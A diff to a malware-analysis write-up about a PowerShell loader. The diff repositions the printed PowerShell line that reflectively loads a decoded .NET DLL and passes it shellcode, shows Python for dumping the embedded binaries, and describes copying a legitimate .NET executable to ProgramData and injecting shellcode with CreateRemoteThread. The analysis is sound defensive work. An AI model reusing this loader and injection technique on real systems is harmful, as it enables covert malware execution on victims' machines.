@@ -26,12 +26,6 @@ $YlkytIDec = rFnQp -NmGwG $YlkytI -IbZzNQ 156
 $JBzyQ = [int[]](45936,38016,42174,...)
 $JBzyQDec = rFnQp -NmGwG $JBzyQ -IbZzNQ 198
 ```
-
-The script then calls  the `YXzTCF3UEJOnjZASdd1lIsyGM` method inside the .dll, providing the shellcode as an argument:
-```powershell
-[System.AppDomain]::CurrentDomain.Load([Byte[]]$YlkytIDec).GetType("BvaCRgKPqlMWeP.BvaCRgKPqlMWeP").GetMethod("YXzTCF3UEJOnjZASdd1lIsyGM").Invoke($null, [Object[]]("riRgiWBjWKRniX56bxatlI8SojlnKvAi6ToDpU7CooIuiNGAWdiwd7M9uIwXhEEIoCPZewlBzwjVWuBLPKnH2l34JZzBcwXRVfVsKdKPeCAixf2LkmZLet2tNKnsuDGkCvl9Syi5OizNPOqLrf6TIxasZGB1UpWJBzzmscLyUIE0ULvUke7we8M2a4MMTSwrnDQN77YlN5oxZKGsdIH2PoMyasTn9NVPYBNgWr8J0gWGXEClXRjUyBZiusstBw29GWittoWSCBql28e0z3wU9R5Hi8dsnsBDgJF3wrvH8Nl0elbt92IDJEr7NX3FiKcU5yPdiu2BmGJ8xGZPUCump3KQd7sFtCz2cmO4ViF54dPyp8rWMnzts3puxlc6H4EfyltNa74Xc4QcLJNY35xTpGEuvzh08Rxd4QC8cGyunPkRjpEHrLmeFu6ihYnJIkLq7K5HjL2As1rJ96srG0y0PNLZQPDkvp40BuA9g8xR9a78xUNyfjqY0QYKrVhgmppmyo4kFObjnD2D4HzxcN8", [Byte[]]$JBzyQDec));
-```
-
 We can dump the two binaries by decoding each byte in the arrays and saving the output to a file:
 ```python
 IbZzNQ_YlkytI = 156
@@ -47,7 +41,15 @@ with open("decoded_JBzyQ.bin", "wb") as f:
     f.write(JBzyQDec)
 ```
 
- The method chooses one of the following legitimate files from `C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\`:
+The script then calls  the `YXzTCF3UEJOnjZASdd1lIsyGM` method inside the .dll, providing the shellcode as an argument:
+```powershell
+[System.AppDomain]::CurrentDomain.Load([Byte[]]$YlkytIDec).GetType("BvaCRgKPqlMWeP.BvaCRgKPqlMWeP").GetMethod("YXzTCF3UEJOnjZASdd1lIsyGM").Invoke($null, [Object[]]("riRgiWBjWKRniX56bxatlI8SojlnKvAi6ToDpU7CooIuiNGAWdiwd7M9uIwXhEEIoCPZewlBzwjVWuBLPKnH2l34JZzBcwXRVfVsKdKPeCAixf2LkmZLet2tNKnsuDGkCvl9Syi5OizNPOqLrf6TIxasZGB1UpWJBzzmscLyUIE0ULvUke7we8M2a4MMTSwrnDQN77YlN5oxZKGsdIH2PoMyasTn9NVPYBNgWr8J0gWGXEClXRjUyBZiusstBw29GWittoWSCBql28e0z3wU9R5Hi8dsnsBDgJF3wrvH8Nl0elbt92IDJEr7NX3FiKcU5yPdiu2BmGJ8xGZPUCump3KQd7sFtCz2cmO4ViF54dPyp8rWMnzts3puxlc6H4EfyltNa74Xc4QcLJNY35xTpGEuvzh08Rxd4QC8cGyunPkRjpEHrLmeFu6ihYnJIkLq7K5HjL2As1rJ96srG0y0PNLZQPDkvp40BuA9g8xR9a78xUNyfjqY0QYKrVhgmppmyo4kFObjnD2D4HzxcN8", [Byte[]]$JBzyQDec));
+```
+
+The large string passed as an argument to the method is possibly a red herring as it doesn't have any functionality inside the malware:
+![method](./pictures/method.png)
+
+ The malware chooses one of the following legitimate files from `C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\`:
   
 ```
 aspnet_regsql
@@ -62,6 +64,6 @@ ngentask
 
 Which is then copied to the location at
 
-`C:\ProgramData\{random 4 lowercase letters}\{random 5 lowercase letters}º.exe`. 
+`C:\ProgramData\{random 4 lowercase letters}\{random 5 lowercase letters}º.exe`.
 
 The malware then proceeds to create a process at this file, allocate virtual memory, write the shellcode into memory and execute it with `CreateRemoteThread`.
